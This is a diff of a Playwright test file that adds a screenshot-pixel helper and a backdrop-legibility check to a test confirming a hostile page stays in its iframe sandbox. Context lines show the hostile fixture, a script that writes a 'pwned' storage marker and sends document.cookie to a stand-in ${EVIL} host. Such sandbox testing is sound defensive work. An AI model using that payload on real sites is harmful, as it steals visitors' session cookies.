@@ -1,4 +1,5 @@
 import { readFileSync } from "node:fs";
+import { inflateSync } from "node:zlib";
 import { test, expect, journeyPart } from "./journey";
 import type { DoubleOptions } from "./hub-double";
 import { journeyDay } from "./clock";
@@ -446,6 +447,18 @@ const HOSTILE = `<!doctype html><html lang="en"><head><meta charset="utf-8"><tit
 <form action="${EVIL}/form" method="post"><input name="secret" value="x"><button id="submit">Submit</button></form>
 <script>document.body.dataset.ran = "1"; parent.postMessage("script", "*"); try { parent.localStorage.setItem("pwned", "1"); localStorage.setItem("pwned", "1"); } catch (e) { parent.postMessage("storage-blocked", "*"); } fetch("${EVIL}/fetch?k=" + document.cookie);</script></body></html>`;
 
+/** The painted RGB of one screen pixel. A 1x1 PNG row has no neighbours, so every filter leaves its bytes raw. */
+async function paintedPixel(tab: import("@playwright/test").Page, x: number, y: number): Promise<number[]> {
+  const png = await tab.screenshot({ clip: { x, y, width: 1, height: 1 } });
+  const data: Buffer[] = [];
+  for (let at = 8; at < png.length;) {
+    const length = png.readUInt32BE(at);
+    if (png.toString("latin1", at + 4, at + 8) === "IDAT") data.push(png.subarray(at + 8, at + 8 + length));
+    at += 12 + length;
+  }
+  return [...inflateSync(Buffer.concat(data)).subarray(1, 4)];
+}
+
 for (const [name, viewport] of [["desktop", { width: 1280, height: 800 }], ["phone", { width: 390, height: 844 }]] as const) {
   test(`HUB-J4 cas-3aff ${name}: a supervisor's page shows inline, and a hostile page stays in its sandbox`, journeyPart, async ({ page: tab, journey }) => {
     await tab.setViewportSize(viewport);
@@ -502,6 +515,12 @@ for (const [name, viewport] of [["desktop", { width: 1280, height: 800 }], ["pho
       await expect(frame.locator("iframe")).toHaveCSS("color-scheme", "dark");
       const inside = tab.frameLocator('iframe[title="Gate report.html, a page from the supervisor"]');
       await expect(inside.locator("body")).toHaveCSS("background-color", "rgb(21, 23, 29)");
+      // A page with no dark styles keeps a light backdrop under its dark text.
+      const plain = log.getByTitle("Flagged page.html, a page from the supervisor");
+      await plain.scrollIntoViewIfNeeded();
+      await expect(tab.frameLocator('iframe[title="Flagged page.html, a page from the supervisor"]').getByRole("heading", { name: "Hostile page" })).toBeVisible();
+      const box = (await plain.boundingBox())!;
+      expect(Math.min(...await paintedPixel(tab, Math.round(box.x + box.width - 6), Math.round(box.y + box.height - 6))), "the plain page is legible on a light backdrop").toBeGreaterThan(200);
       await tab.emulateMedia({ colorScheme: "light" });
       await expect(tab.locator("html")).toHaveAttribute("data-scheme", "light");
     });
